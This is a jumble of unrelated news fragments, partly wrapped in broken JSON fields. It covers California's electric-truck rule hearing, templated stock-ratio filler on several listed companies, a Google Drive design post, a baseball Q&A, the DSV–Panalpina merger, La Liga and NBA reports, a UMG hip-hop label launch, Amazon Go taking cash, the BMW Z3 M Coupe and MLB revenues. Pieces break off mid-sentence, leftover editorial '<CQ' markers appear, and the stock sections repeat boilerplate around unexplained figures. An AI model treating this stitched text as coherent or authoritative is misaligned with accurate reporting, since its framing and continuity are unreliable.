Manufacturers of other truck segments, ranging from refuse trucks to step vans, also would be required to sell their trucks in various percentages beginning in 2024. \nThe proposal also would require carriers with gross revenues greater than $50 million or that own more than 100 vehicles greater than 8,500 pounds that operate facilities in California to report their vehicle activity. The one-time reporting would need to be completed by April 1, 2021, and would include characteristics of vehicles domiciled or assigned to the facilities. \nThe board could decide on a final ACT rule next year, but based on comments from the public, truckers, environmentalists, disadvantaged community residents and even CARB board members, the issue is volatile. Commenters at the Dec. 12 hearing generally ranged from those who believe the plan was attempting to deploy the new technology too fast, to those criticizing it for not moving fast enough. \nNichols \n\u201cOur goal here is to transform the transportation system. It\u2019s not just to meet a target,\u201d CARB board Chairman Mary Nichols said. \u201cWe need to move as fast as we can without screwing things up. This is tough stuff. If it were easy, it would have been done by now.\u201d \nIndeed, the degree of difficulty in converting the trucking industry from diesel to electric \u2014 the state has a goal of 100% by 2045 \u2014 is high. \n\u201cWe support zero-emissions vehicles,\u201d Jed Mandel, president of the Truck and Engine Manufacturers Association, told the board at the five-hour-plus public hearing that brought 100 commenters to the podium. \u201cBut designing a program based on a naked sales mandate is fundamentally flawed. Trucks are not cars.\u201d \nMandel suggested that for a successful rollout of electric vehicles, CARB begin with those trucking segments that are more readily suited to the technology, not heavy longhaul trucks but rather buses and step vans. \n\u201cThere\u2019s a great deal of intrigue when it comes to electric trucks, but not a lot of experience,\u201d said Mike Tunnell, California-based director of environmental research for American Trucking Associations. \u201cThere\u2019s hope and anticipation that these vehicles will be able to stand up to the daily demands of the industry in terms of range, durability and reliability.\u201d \nBut Tunnell said that, so far, companies are mostly only evaluating prototypes. \nTunnell \n\u201cWe are just beginning the stages of understanding the challenges and opportunities that this technology presents,\u201d he said. \n\u201cLet me be clear: Volvo is committed to bringing battery-electric vehicles to market, and we are aligned with CARB\u2019s goals in this regulation,\u201d said Dawn Fenton, director of sustainability and public affairs for Volvo Group North America. \u201cOur concern is that the Advanced Clean Trucks Regulation as currently drafted will undermine the realization of these goals and negatively impact California\u2019s economic and environmental well-being, as well as our own investments.\u201d \nFenton said Volvo requests that the board direct senior CARB staff to work with industry and other stakeholders to develop a \u201cmore focused approach\u201d over the coming months to ensure that all elements of a successful program are addressed. \n\u201cThe Volvo group has taken a leap of faith by investing hundreds of millions of dollars to bring these zero-emission vehicles to market,\u201d Fenton said. \u201cWe are asking fleets to jump with us. But we both need the supporting winds from CARB to fill our parachutes and create a safe landing for all stakeholders.\u201d \nHector De La Torre, a member of the CARB board and former member of the California State Assembly, cautioned that the agency needs more information before it pushes electric trucks in certain categories. \n\u201cI agree that we need to be as aggressive as we can be, but I think the key is availability,\u201d De La Torre said. \u201cFrom what I\u2019m hearing, it won\u2019t be until the mid-2020s that commercial trucks will be available. I\u2019m talking longhaul [Class] 7s and 8s. So we\u2019re not there yet with those, clearly.\u201d \nWant more news? Listen to today's daily briefing:",

The Shareholder Yield of Singapore Airlines Limited (SGX:C6L) is 0.039487. This percentage is calculated by adding the dividend yield plus the percentage of shares repurchased. Dividends are a common way that companies distribute cash to their shareholders. Similarly, cash repurchases and a reduction of debt can increase the shareholder value, too.

Knowing when to sell can be just as important as deciding which stocks to buy. Holding on to a loser for too long may leave a sour taste in the mouth. Investors may have unrealistic expectations about a particular name. Knowing when to cut and run can be a gigantic savior for overall portfolio health. Of course if investors end up selling winners too early, they will most likely be leaving too much profit on the table. Finding a good balance and knowing overall market conditions can help with the decision if the time has come. Closely tracking fundamentals and technicals can help give some insight into stock price behavior. Making sure company earnings are in line may also be a wise choice when investing in a recently researched stock. \nThe Shareholder Yield of Independence Group NL (ASX:IGO) is 0.002193. The Shareholder Yield is a way that investors can see how much money shareholders are receiving from a company through a combination of dividends, share repurchases and debt reduction.

With markets still riding high, this may not be the easiest thing in the world right now. Finding those perfect stocks before they become household names may take a lot of research and homework. Many investors will apply various strategies for picking stocks. If there was one that worked for everybody, it would make things super easy. Of course, this is not the case. Obviously, there are no guarantees in the stock market. Some investors may only focus on the fundamentals of a company and completely ignore the technicals. Others may choose to only watch technicals and never take a look at the underlying company information. Combining both areas of research may help give a better feel of what is going on with the stock in the long term and the short term. Individual investors who manage their own portfolios may need to put in a lot more time than those who don\u2019t. Successful investors often have an uncanny way of filtering out the noise and keeping their focus on the right information. \nThe Gross Margin Score is calculated by looking at the Gross Margin and the overall stability of the company over the course of 8 years. The score is a number between one and one hundred (1 being best and 100 being the worst). The Gross Margin Score of Independence Group NL (ASX:IGO) is 5.00000.

Many individual investors would agree that information is highly important when picking stocks. Possessing the correct information about a public company is of the utmost importance. Knowing how to interpret the information is another skill investors may need to master before becoming fully immersed in the stock market.

      "text": "We are living in the age of applications and we usually get at least one app-update per day. Many apps that we use are always working hard to fix the bugs and implement new features for their users. \nThe latest update that I saw first in Dribbble from Google design team, and later I had the chance to test it on my own mobile device is the newest redesign of Google Drive. \nAs always, Google design team is doing a great job with their design solutions and features, like the last one for the Chrome mobile version which I had some words on my previous article. \nWhile checking out the newest Drive for iOS, I noticed a change on the tab bar which is not on the Human Interface Guidelines by Apple. \nUsually, I have seen this type of tab bar interaction on some Dribbble concepts like those here: \nThis was interesting because I haven\u2019t seen something like this on iOS before, even though I am such an apps person having installed 117 apps on my phone! Huge, right? \nBut this doesn\u2019t mean that Google design team is copying from Dribbble because if you look at the material design theme, they currently have added this option of tab-bar on their documentation. \nLooking forward to see great design solutions by Google team again. \nHit that claps button as hard as you want and Follow me because I am writing for UX tips and great example of UX on mobile phones. \nApart from it being a job, making the user experience friendly and easy is what I love and feel accomplished while doing. I also like to write case studies and critiques on My Blog. My design works can be found on my Dribbble and Behance profiles. \nThank you. \nhttps://medium.com/media/a19f46680bac3cbdc42953c920d0c104/href \nIs Google Drive design team getting \u201cinspired\u201d by Dribbble concepts? was originally published in UX Collective on Medium, where people are continuing the conversation by highlighting and responding to this story.",

One of his side projects is a quick-hitter Q/A we\u2019re calling \u201cTwo Minutes With \u2026\u201d \nPrevious editions: Anthony Rizzo | Jo Adell | Max Muncy | Touki Toussaint | Clint Frazier | Pat Neshek | Jonny Venters | Steve Cishek | Chris Iannetta | Cal Quantrill | Ben Gamel | Robert Stock \nUp now: Rockies ace Kyle Freeland \nSN: What\u2019s one of your first baseball memories? \nFREELAND: I\u2019m playing tee ball growing up, my dad being a coach and playing with all my friends at a local field by my house. In tee ball, before we got into coach-pitch, I played first base because I was one of the only lefties on the team. My brother was three years older than me, so I would always be at their practices. So I kind of learned at a higher level and kind of get a little bit of an edge. \nWhat\u2019s the last show you binge-watched? \nFREELAND: The last show I binge-watched was \"Game of Thrones,\" to get all caught up and ready for the new season. I had watched a multiple seasons of it, and my girlfriend hadn't seen any of it, so I went back all the way to the beginning of the series with her. It\u2019s definitely time-consuming, with how long those episodes are. \nFight for the living. #GameofThrones pic.twitter.com/GpG7m53Nqg \n\u2014 Game of Thrones (@GameOfThrones) April 2, 2019 \nWhat\u2019s your favorite free-time activity? \nFREELAND: Playing golf. I\u2019ve got a 2 handicap. Been playing for quite a long time. That's my, kind of, release from baseball. Get my mind off baseball. \nHow far do you hit the ball off the tee? \nFREELAND: In Colorado, I hit the ball pretty far. I probably venture to say I carry it about 320 to 330 in Colorado, and here (Phoenix) about 300 yards or so. \nWhat\u2019s one talent you\u2019d most like to have? \nFREELAND: I don\u2019t know. That\u2019s kind of a brain buster. \nWhat was your first job? \nFREELAND: Baseball was my first job. Growing up, everything was always surrounded baseball, and I never really had time to go work for a little bit of money. \nWhat\u2019s best purchase you\u2019ve ever made? \nFREELAND: I would say my house, but that's kind of a necessity. I\u2019d probably say my car, that's probably my best and favorite purchase. It\u2019s a Jeep Grand Cherokee SRT8. I\u2019ve had it since right after I was drafted, so the fall of 2014. That was my first bonus purchase. \nWho\u2019s one of your favorite Twitter follows? \nFREELAND: Oh, what's his name? Dan Haren . He's a good follow. I started following him and his stuff just cracks me up, how creative he is.",

The first bid valued Panalpina at around CHF4B and was rejected in January. \nIn a new joint statement from Copenhagen and Zurich DSV and Panalpina say they have reached an agreement on the terms and conditions of a combination by way of a Public Exchange Offer to all Panalpina shareholders. \nAssuming the offer is successful, DSV and Panalpina will become one of the world\u2019s largest transport and logistics companies with a pro forma revenue of around DKK118B (\u20ac15.8B) and a workforce of more than 60,000 employees operating in 90 countries. \nFollowing completion, DSV will propose to its shareholders, at an EGM, to change its name to DSV Panalpina A/S, to reflect the long, rich history of both companies. \nKurt Larsen, Chairman of the Board of DSV, said: \"A combination of DSV and Panalpina further strengthens our position as a leading global freight forwarding company. Together, we can present a strong global network and enhanced service offering to our clients, further solidifying our competitive edge in the industry. It\u2019s a great match on all parameters.

The board of directors\u2019 assessment is that the updated proposal of DSV is very attractive. We are now looking forward to joining forces with DSV and contributing to creating, one of the world\u2019s largest transport and logistics companies.\" \nDSV and Panalpina say the tie-up is a strong match, with many potential synergies as a result of similarities in business models, services and strategies: \nUnique customer relationships and vertical expertise \nOperational excellence and efficiency \u2018DNA\u2019 \nCommercial synergies and cross-selling opportunities from stronger network and service offerings, new competencies and skills \nConsolidation of operations, administration and logistics facilities \nConsolidation of IT infrastructure \nFollowing settlement of the Public Exchange Offer, further details on the impact of the acquisition will be communicated.",

      "text": "Manu Fernandez/Associated Press \nBarcelona took a giant step toward retaining the title in La Liga by beating nearest rival Atletico Madrid 2-0 at the Camp Nou on Saturday. Late goals from Luis Suarez and Lionel Messi opened up an 11-point lead at the top of the table, with Atleti undermined by temperamental striker Diego Costa receiving a red card in the first half. \nEarlier, a Karim Benzema double helped Real Madrid beat Eibar and rebound from losing in Valencia on Wednesday. Speaking of Valencia, Los Che suffered a damaging defeat in their pursuit of a top-four finish after losing to relegation-threatened Rayo Vallecano. \nThe day began with Espanyol scoring an impressive win in Girona, with Sergi Darder in fine form. \nSaturday Results \nGirona 1-2 Espanyol \nReal Madrid 2-1 Eibar \nRayo Vallecano 2-0 Valencia \nBarcelona 2-0 Atletico Madrid \nLaLiga @LaLigaEN \n\ud83d\udd1d @FCBarcelona \ud83d\udd1d #LaLigaSantander https://t.co/qh6soM4IJB \nCosta continued an unwanted trend for Atletico against Barca when he was red carded after 28 minutes. The 30-year-old was told to walk following a heated verbal exchange with referee Jesus Gil Manzano. \nOptaJose @OptaJose \n9 - Nine Atl\u00e9tico's players have been sent off against Barcelona since Simeone era, triple than against any other opponent in all competition in the process. Severity https://t.co/YOtfpoY2Wx \nAtleti were down a man but still made life difficult for the hosts. Messi and Co. struggled to get on track against a physical defence, packed midfield and a high-pressing forward line led by Antoine Griezmann. \nWhen Barca did fashion chances, Jan Oblak proved a stubborn figure in the Atletico goal. \nOptaJose @OptaJose \n81% - Jan Oblak has saved 81 of 100 shots on target faced in #LaLiga this season (81%), the best percentage for a keeper in the Top 5 European Leagues (at least 13 games played). Fence https://t.co/TGRtaENcoo \nFittingly, it took something spectacular to get past Oblak, and Suarez duly delivered it when he thundered a curled effort in from the edge of the area. \nbeIN SPORTS USA @beINSPORTSUSA \n\ud83d\udd35\ud83d\udd34 GOOOAAAL: It took 85 minutes, but Luis Suarez found the opener for Barcelona. #BarcaAtleti https://t.co/4Y8AKSHtWv \nEleven Sports @ElevenSports_UK \n| GOAL! | Luis Suarez, take a bow! \ud83c\udfaf A goal worthy of winning this match for Barcelona! https://t.co/BeoQQb0AFn \nIt was left to Messi to wrap up the points with a deftly taken goal three minutes from time. \nHe wrong-footed Oblak with a cute finish that makes another title win close to inevitable for the Blaugrana. \nB/R Football @brfootball \nLeo Messi now has the most wins in La Liga history \ud83d\udd79 https://t.co/TNW4O3nWHN \nReal needed Benzema after Marc Cardona had given Eibar the lead six minutes before the break at the Santiago Bernabeu. Fortunately, Benzema has seized the role of Los Blancos' attacking talisman since Cristiano Ronaldo left for Juventus last summer. \nThe Frenchman drew the hosts level just before the hour mark. Then the former Lyon ace won it nine minutes from time. \nSquawka Football @Squawka \nKarim Benzema has now scored 16 league goals this season; at least twice as many as any other Real Madrid player. Saving the day again. \ud83e\uddb8\u200d\u2642\ufe0f https://t.co/9td3jLNXVW \nWhile Benzema is thriving, Gareth Bale is looking like an increasingly forlorn figure in the Spanish capital. The home supporters haven't been shy about chiding the 29-year-old whenever he makes a mistake. \nThe Spanish Football Podcast @tsf_podcast \nBale miscontrols the ball and there are a few first (half-hearted) whistles for him. 3 minutes gone. \nThe Spanish Football Podcast @tsf_podcast \nBale through on goal, one-on-one... Saved. Louder whistles now. \nThe Spanish Football Podcast @tsf_podcast \nBale shoots well wide from outside the box. Louder whistles again. \nBale hasn't managed to fill Ronaldo's shoes, and the absence of another dependable match-winner to support Benzema will continue to blight manager Zinedine Zidane's efforts to return Real to the success of recent seasons. \nValencia appeared on the way to at least a taste or former glories after brushing Real aside earlier in the week. However, Rayo burst the bubble thanks to goals from Raul De Tomas and Mario Suarez. \nRayo are still fighting for survival but have closed the gap on Villarreal to just three points. The Yellow Submarine can create a bigger cushion with a win away to Real Betis on Sunday. \nDarder sent Espanyol on the way to victory when he finished smartly on 59 minutes in Girona. Cristhian Stuani equalised from the penalty spot, but Girona were denied a share of the points when goalkeeper Yassine Bounou put into his own net in the penultimate minute.",

      "text": "Joel Embiid will not be on the floor Thursday. \nThe 25-year-old star, who continues to deal with knee soreness, has been ruled out for the third game of the 76ers' opening-round series against the Nets at the Barclays Center. \nThe Sixers say that Joel Embiid is out with left knee soreness. Greg Monroe will start. \n- Dave McMenamin (@mcten) April 18, 2019 \nRelated News \n\"It's tough. That's what tendinitis is all about,\" Embiid told reporters after he was ruled out ( via ESPN ). \"And some days you got your days and some other days is different. So even in the games that I play I just try to go out there and try to play for these guys. ... I try to help us win the series and eliminate them. So whatever, whatever I can do. But it's hard. I just got to keep pushing it and see how I do.\" \nEmbiid was \"a game-time decision\" for the last two matchups. He took the court in Game 2 and tallied 23 points, along with 10 rebounds, in Philadelphia's 145-123 win. \nEmbiid was again involved in controversy in that victory. He was called for a flagrant foul after elbowing Jarrett Allen in the face and apologized for the incident following the game. Embiid and fellow 76ers star Ben Simmons then immediately started laughing. \n\"We didn't really like that. We thought that was kind of disrespectful, especially after the elbow he threw,\" Nets guard Caris LeVert said Wednesday, via the New York Daily News . \"It is what it is. There's no love lost. It's a playoff series. We expect that.\" \nEmbiid missed five of the 76ers' last seven regular-season games with the knee issue. Philadelphia coach Brett Brown described Embiid's injury as a \"slippery slope\" when he met with reporters last weekend \n\"We are the recipient of Jo trying to inch along slowly and buy time,\" Brown said ( via The Philly Voice ). \"You win a game, two more days, you win a game, three more days, you might drop one, four more days. How do you deliver him responsibly to a later date in ultimately what you hope will be a deep playoff run?\" \nThe two-time All-Star averaged 27.5 points and 13.6 rebounds in 33.7 minutes per game in 2018-19. He shot 48.4 percent from the field and 30 percent from 3-point range. \n\"It's not as clear cut as you thought it would be on 'how do you maintain a fitness base and still get his knee rest?'\" Brown said. \"What do we do to help him most now? I believe a solid plan is in place that can deliver him responsibly, incrementally to later dates.\" \nThe 76ers and Nets entered play Thursday with their series tied at 1-1.",

      "text": "Universal Music Group is launching a new hip-hop-focused label in India in partnership with legendary rapper Nas and Mass Appeal. \nMass Appeal India is being touted by the major music company as \u201can innovative new label dedicated to amplifying India\u2019s burgeoning hip-hop culture on a global scale\u201d. \nIt will be based in Mumbai, within Universal Music India\u2019s (UMI) headquarters and will function as a \u201cmulti-channel partnership\u201d between Mass Appeal and UMG. \nThe news comes little over two years after UMG led a $6m investment into Mass Appeal , which was originally founded in 1996, and then revived via a Nas-fronted funding round in 2013. \nMass Appeal India will sign artists from India\u2019s hip-hop scene, and, through Mass Appeal\u2019s global network, work with brands and content creators to connect them to a worldwide audience. \nMass Appeal India will leverage UMI\u2019s marketing and promotion teams within India, whilst Mass Appeal will lead release strategy within the U.S. and Canada. \nAll releases from Mass Appeal India will be distributed exclusively via UMG worldwide, with additional support across its network of more than 60 territories for select artists and projects. \nThe first marquee signing at Mass Appeal Indie is acclaimed Hindi rapper DIVINE, who boasts more than 1.2m subscribers to his personal YouTube channel . A central figure in the \u2018gully rap\u2019 movement, DIVINE\u2019s biggest singles so far include Meri Gully Mein , Jungli Sher and Kaam 25 . \nDIVINE\u2019s 2016 single Jungli Sher was the first Indian single that Apple Music released as a timed exclusive worldwide. \nDIVINE was also the first Indian artist to be featured on BBC 1 Xtra\u2019s \u2018Fire In The Booth\u2019 in 2016. \n\u201cHip-hop is the world\u2019s most influential culture \u2013 it\u2019s only right to share what we do at Mass Appeal on a global level.\u201d \nNas \nIn announcing the launch of Mass Appeal India, Nas said, \u201cI was first introduced to DIVINE\u2019s music through the brilliant film Gully Boy. I\u2019m proud to announce the launch of Mass Appeal India with DIVINE as the first artist on our roster. \n\u201cHip-hop is the world\u2019s most influential culture \u2013 it\u2019s only right to share what we do at Mass Appeal on a global level. We\u2019re excited about joining forces with the team at UMG India to help further spark a movement that is constantly in the making.\u201d \nAdam Granite, EVP, Market Development, Universal Music Group, said, \u201cFor many years hip-hop, regardless of local language, has been growing rapidly around the world as the authentic sound of the streets. We are excited to work together with Nas, Peter, DIVINE, Devraj and the UMI team to launch Mass Appeal India, which we believe will become India\u2019s premier dedicated hip-hop brand. The emergence of Mass Appeal India and the signing of Divine will only fuel the next wave of Indian hip-hop and rap talent and help accelerate the growth and reach of the genre in India, the subcontinent and beyond.\u201d \nDIVINE\u2019s story and rise of the Indian hip-hop scene inspired Bollywood director Zoya Akhtar\u2019s 2019 acclaimed feature film Gully Boy, starring Ranveer Singh, which has also become one of the year\u2019s biggest Bollywood films at the box office. Gully Boy\u2019s soundtrack featured DIVINE on five tracks. \nVIDEO \n\u201cIt\u2019s an honour to be associated with a legend like Nas. I grew up listening to his music. For him to recognise not just me, but the whole Indian hip-hop scene is a big win for hip-hop, and for hip-hop in India,\u201d DIVINE says of signing with Nas\u2019 Mass Appeal. \n\u201cHe is looking forward to working not just with me, but a lot of the young talent in India. I will be working with Mass Appeal India not just in a personal capacity, but also in my capacity as founder of Gully Gang Entertainment to help Mass Appeal India build a thriving ecosystem for urban music and culture in the sub-continent. So, let\u2019s bring our A-Game because the world is watching,\u201d he adds. \nDevraj Sanyal, MD & CEO of UMG, India & South Asia said, \u201cOver the past few years UMI has concentrated on creating a culture of artist-first, non-film music to satisfy India\u2019s rapidly evolving music audience. Hip-hop has been a key area of this focus and we have found the natural partner in Mass Appeal, Nas & Peter to help realise our dream of breaking Indian hip-hop in the region, as well as to the rest of the world together. \n\u201cIt was only right to lead this global announcement with the signing of India\u2019s number one hip-hop star, DIVINE for his highly anticipated debut album. As he articulately puts it, \u201cApna time Aayega\u201d which means, \u201cour time will come\u201d \u2013 now is certainly the time for Indian Hip-Hop to break into the mainstream.\u201d \n\u201cHip-hop has been a key area of this focus and we have found the natural partner in Mass Appeal, Nas & Peter to help realise our dream of breaking Indian hip-hop in the region, as well as to the rest of the world together.\u201d \nDevraj Sanyal, UMG \nPeter Bittenbender, CEO of Mass Appeal, said, \u201cComing off what has been a landmark year for Mass Appeal, we are beyond thrilled to announce the global expansion of our brand in partnership with UMI and with DIVINE as our first superstar talent signing.

      "title": "Cashierless Amazon Go stores are planning to accept cash",
      "text": "Amazon Go convenience stores will begin to accept cash, according to a report this morning from CNBC, which Amazon confirmed. The retailer didn\u2019t say when cash would be added to existing stores as a payment option, however, only that it was planned. The issue with the cashierless, automated Amazon Go stores is that they require customers to use a stored bank or credit card associated with their Amazon account to make a purchase. This can be discriminatory towards the un-banked and under-banked, who typically pay with cash. \nCNBC points out also the change comes at a time when many cities are enacting legislation that would ban cashless stores \u2013 that is, stores in some markets will be required to accept cash, as a means of catering to the unbanked who account for around 8.4 million (6.4%) of U.S. households. \nPhiladelphia last month became the first store to ban cash, the report notes, followed by the state of New Jersey. Other cities are considering this, as well, including New York, San Francisco and Chicago. \nAmazon may be trying to get ahead of the legislation by working to accept cash in its cashierless stores before these laws spread across the U.S. \nBut it remains to be seen how Amazon will implement cash payments. Will it actually staff its cashierless stores with a cashier, or will it go the self-checkout route, where a machine takes the cash payment through inserted bills and then dispenses change? \nIn either case, the need to accept cash payments could dampen the store\u2019s performance, as it could create lines and bottlenecks in the stores and slow the stores high performance. If self-checkout machines were used, there\u2019s overhead in stocking them with cash, maintenance, and helping customers when they inevitably break down. But a dedicated cashier could mean an expanded headcount, and the costs associated with additional employees. \nAccording to one analysis , Amazon Go\u2019s Seattle Store has been generating 4 to 5 the number of inventory turns per year compared to typical retailers, and its annual sales per square foot of the selling area was $2,700. These figures are expected to grow as more customers shop the stores, along with other tweaks Amazon may make to drive more sales. But this level of performance is possible because of the automation. \nCNBC caught wind of Amazon\u2019s plans through a tip from an insider who sent the site a recording of an Amazon employee meeting, where Amazon\u2019s senior vice president of physical stores, Steve Kessel, was responding to a question about the \u201cdiscrimination and elitism\u201d at Amazon Go stores. \nThe retailer confirmed his response, where he said Amazon was \u201cplanning additional payment mechanisms.\u201d Specifically, Amazon said customers would be able to check out, pay with cash, and receive change.",

      "title": "How the Legendary BMW M Coupe Was Designed in Secret",
      "text": "When the 1998-2002 clown shoe BMW Z3 M Coupe was first presented to management (the first prototype of the Z3 Coupe, rather), the executive was lost for words. He just stood there, silent, as Car Magazine reported at the time. That probably wasn\u2019t a good thing. \nThere was a reason for it being ugly, and there\u2019s a reason why it has become as beloved as it has, but I\u2019m getting ahead of myself. \nThe Z3 M Coupe is an interesting car, maybe the most interesting car that BMW has developed in the last few decades. \nInitial work started around 1992, as BMW notes. That\u2019s just a few years after the Miata came out and shocked the world as a wildly successful, profitable roadster with a pretty basic mechanical design and retro style. The Z3 was part of a little baby boom after it, along with cars like the original Porsche Boxster . \nBut the guy running the program, a former Daimler engineer named Burkhard Goeschel <CQ (who had been poached to work at BMW motorcycles before taking on the Z3 project) wanted more than a floppy roadster with vintage styling. He wanted a car that was good to drive. \nAnd to be good to drive, you want a rigid chassis. and to have a rigid chassis you don\u2019t want a drop top, you want a stiff coupe. \nSo Goeschel <CQ and a handful of engineers squired away an early Z3 prototype, hacking it up in the basement, and melded it together into a coupe using foam and foil, as Car recounts. \nI guess if you\u2019ve ever looked at an M shoe and thought, hey, that looks like a bunch of engineers hacked it together in a basement, you would be right on the nose. \nThe reason for it wasn\u2019t just that it made the car potentially better to drive, some 2.6-times stiffer than the roadster, as the BMW M Registry notes. (Nor was it to make the car particularly more practical, though the big hatchback trunk is a very nice bonus.) Normally coupes get their own fancy, sculpted bodies. Styling is key. Flowing low fastbacks, that sort of thing. The following Z4 coupe is just that kind of car. \nThe Z3 Coupe, however, was basically just a box stuck on the back of a Z3 roadster. And that was because, well, it was easy, and because it was as simple and affordable to do. Remember, Goeschel <CQ and his team made this car first and then asked permission to make it second. They wanted as easy a business case as possible. As we noted in our old induction of this car into the Jalopnik Fantasy Garage , even the rear fenders are the same on M and non-M versions of the Coupe, just to save the company some money on stamping parts. <CQ \nAnd it all worked. The Z3 Coupe might be one of the ugliest cars to make it to production in the modern era, but made it it did. \nWas all the effort worth it? Having driven the car, my short answer is yes. My long answer is in the video at the top of the post.",

      "text": "Revenues for Major League Baseball continue to grow and should accelerate in the coming years. \nGross revenues for the league were $10.7 billion for 2019, up from $10.3 billion last year , according to industry sources who spoke on the condition of anonymity. That marks the 17th consecutive year that MLB has seen record growth. \nThe league surpassed the $10 billion mark in 2017 after seeing steep growth. League sources indicate that that trajectory should reoccur over the next few seasons as new national television deals kick in. FOX reached an extension in 2018 that starts in 2022 and runs through 2028 with a reported value of $5.1 billion, a 40% increase from the current media rights agreement. Negotiations for extensions with ESPN and Turner Sports are on-going and would arrive at the same time. In 2020, a $1 billion uniform deal with Nike kicks in. \nMore importantly, industry revenues that account for expenses and other investments came in at $9.7 billion for 2019, up from $9.4 billion last year. MLB player payrolls, bonuses that raised average annual value of new deals for the likes of Mike Trout, and benefits for the year came in at $4.7 billion. \nIncreases in revenues continue to be tied to media rights, new or extensions of sponsorship deals, and steady revenues at the gate in the face of attendance decline. \nSince 1992, when Bud Selig took over as commissioner on a full-time basis, league gross revenues have grown from $1.2 billion, an 386% increase when accounting for inflation.",

      "title": "Posco Chemtech Company Ltd. (KOSDAQ:A003670), Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) P/CF Ratio Under Review",
      "text": "In order to determine if a company is fairly valued, we can look at a number of different ratios and metrics. First off we\u2019ll take a look at the Price to Cash Flow ratio of Posco Chemtech Company Ltd. (KOSDAQ:A003670). The firm currently has a P/CF ratio of 41.913394. \nThis is the current Price divided by Cash Flow Per Share for the trailing twelve months. Cash Flow is defined as Income After Taxes minus Preferred Dividends and General Partner Distributions plus Depreciation, Depletion and Amortization. \nIndividual investors often strive to create a solid strategy before trying to take on the market. Setting up realistic, attainable goals, may be a good place for the amateur to start. There are many different approaches that the investor can take when getting into the stock market. Some investors will try to follow strategies that have worked for others in the past. Sometimes this will work, and sometimes it will not. Markets and economic landscapes are constantly changing. A strategy that worked yesterday may not work again tomorrow. Investors who put in the time to do the necessary homework may find themselves much better off when the market decides to rear its ugly head at some point down the road. \nProfitability \nThe Return on Invested Capital (aka ROIC) for Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 0.162472. The Return on Invested Capital is a ratio that determines whether a company is profitable or not. It tells investors how well a company is turning their capital into profits. The ROIC is calculated by dividing the net operating profit (or EBIT) by the employed capital. The employed capital is calculated by subrating current liabilities from total assets. Similarly, the Return on Invested Capital Quality ratio is a tool in evaluating the quality of a company\u2019s ROIC over the course of five years. The ROIC Quality of Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 4.509630. This is calculated by dividing the five year average ROIC by the Standard Deviation of the 5 year ROIC. The ROIC 5 year average is calculated using the five year average EBIT, five year average (net working capital and net fixed assets). The ROIC 5 year average of Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 0.181339. \nPosco Chemtech Company Ltd. (KOSDAQ:A003670) has a Price to Book ratio of 4.728025. This ratio is calculated by dividing the current share price by the book value per share. Investors may use Price to Book to display how the market portrays the value of a stock. Checking in on some other ratios, the company has a Price to Cash Flow ratio of 41.913394, and a current Price to Earnings ratio of 26.817983. The P/E ratio is one of the most common ratios used for figuring out whether a company is overvalued or undervalued. \nAfter a recent scan, we can see that Posco Chemtech Company Ltd. (KOSDAQ:A003670) has a Shareholder Yield of 0.000000 and a Shareholder Yield (Mebane Faber) of 0.00215. The first value is calculated by adding the dividend yield to the percentage of repurchased shares. The second value adds in the net debt repaid yield to the calculation. Shareholder yield has the ability to show how much money the firm is giving back to shareholders via a few different avenues. Companies may issue new shares and buy back their own shares. This may occur at the same time. Investors may also use shareholder yield to gauge a baseline rate of return. \nThe EBITDA Yield is a great way to determine a company\u2019s profitability. This number is calculated by dividing a company\u2019s earnings before interest, taxes, depreciation and amortization by the company\u2019s enterprise value. Enterprise Value is calculated by taking the market capitalization plus debt, minority interest and preferred shares, minus total cash and cash equivalents. The EBITDA Yield for Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 0.035651. \nThere are many different tools to determine whether a company is profitable or not. One of the most popular ratios is the \u201cReturn on Assets\u201d (aka ROA). This score indicates how profitable a company is relative to its total assets. The Return on Assets for Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 0.158113. This number is calculated by dividing net income after tax by the company\u2019s total assets. A company that manages their assets well will have a higher return, while a company that manages their assets poorly will have a lower return. \nQuant Scores \nThe Gross Margin Score is calculated by looking at the Gross Margin and the overall stability of the company over the course of 8 years. The score is a number between one and one hundred (1 being best and 100 being the worst). The Gross Margin Score of Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 50.00000. The more stable the company, the lower the score. If a company is less stable over the course of time, they will have a higher score. \nThe C-Score is a system developed by James Montier that helps determine whether a company is involved in falsifying their financial statements. The C-Score is calculated by a variety of items, including a growing difference in net income verse cash flow, increasing days outstanding, growing days sales of inventory, increasing assets to sales, declines in depreciation, and high total asset growth. The C-Score of Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 4.00000. The score ranges on a scale of -1 to 6. If the score is -1, then there is not enough information to determine the C-Score. If the number is at zero (0) then there is no evidence of fraudulent book cooking, whereas a number of 6 indicates a high likelihood of fraudulent activity. The C-Score assists investors in assessing the likelihood of a company cheating in the books. \nThe ERP5 Rank is an investment tool that analysts use to discover undervalued companies. The ERP5 looks at the Price to Book ratio, Earnings Yield, ROIC and 5 year average ROIC. The ERP5 of Posco Chemtech Company Ltd. (KOSDAQ:A003670) is 8573. The lower the ERP5 rank, the more undervalued a company is thought to be. \nAt the time of writing, Posco Chemtech Company Ltd. (KOSDAQ:A003670) has a Piotroski F-Score of 6. The F-Score may help discover companies with strengthening balance sheets. The score may also be used to spot the weak performers. Joseph Piotroski developed the F-Score which employs nine different variables based on the company financial statement. A single point is assigned to each test that a stock passes. Typically, a stock scoring an 8 or 9 would be seen as strong. On the other end, a stock with a score from 0-2 would be viewed as weak. \nChecking in on some valuation rankings, Posco Chemtech Company Ltd. (KOSDAQ:A003670) has a Value Composite score of 61. Developed by James O\u2019Shaughnessy, the VC score uses five valuation ratios. These ratios are price to earnings, price to cash flow, EBITDA to EV, price to book value, and price to sales. The VC is displayed as a number between 1 and 100. In general, a company with a score closer to 0 would be seen as undervalued, and a score closer to 100 would indicate an overvalued company. Adding a sixth ratio, shareholder yield, we can view the Value Composite 2 score which is currently sitting at 57. \nStock market knowledge can be highly powerful. Successful investors are often highly knowledgeable and have put in the appropriate amount of time to become this way. Proper stock market knowledge may take a long time to acquire. Investors may spend countless hours trying to get an edge, and they may still feel like they are swimming upstream. Preparation and common sense can be highly important when trying to stay on top of the equity market. These days, there is no shortage of information for investors to get their hands on. The challenge then becomes how best to use the information at hand in order to develop knowledge that will help drive profits higher. \nThe Price to Cash Flow for Hyundai Heavy Industries Co., Ltd. (KOSE:A009540) is 67.071238. The price to cash flow formula is a useful tool investors can use in order to determine the value of a company. Generally, a higher 